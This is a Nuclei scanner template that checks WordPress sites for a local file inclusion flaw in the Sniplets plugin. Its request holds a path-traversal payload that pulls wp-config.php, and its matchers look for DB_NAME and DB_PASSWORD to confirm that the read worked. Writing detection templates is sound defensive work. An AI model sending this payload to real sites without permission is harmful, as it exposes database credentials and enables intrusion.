id: wp-sniplets-lfi

info:
  name: Wordpress Plugin Sniplets LFI
  author: dhiyaneshDK
  severity: high
  reference:
    - https://www.exploit-db.com/exploits/5194
  tags: wordpress,wp-plugin,lfi

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DB_NAME"
          - "DB_PASSWORD"
        part: body
        condition: and

      - type: status
        status:
          - 200
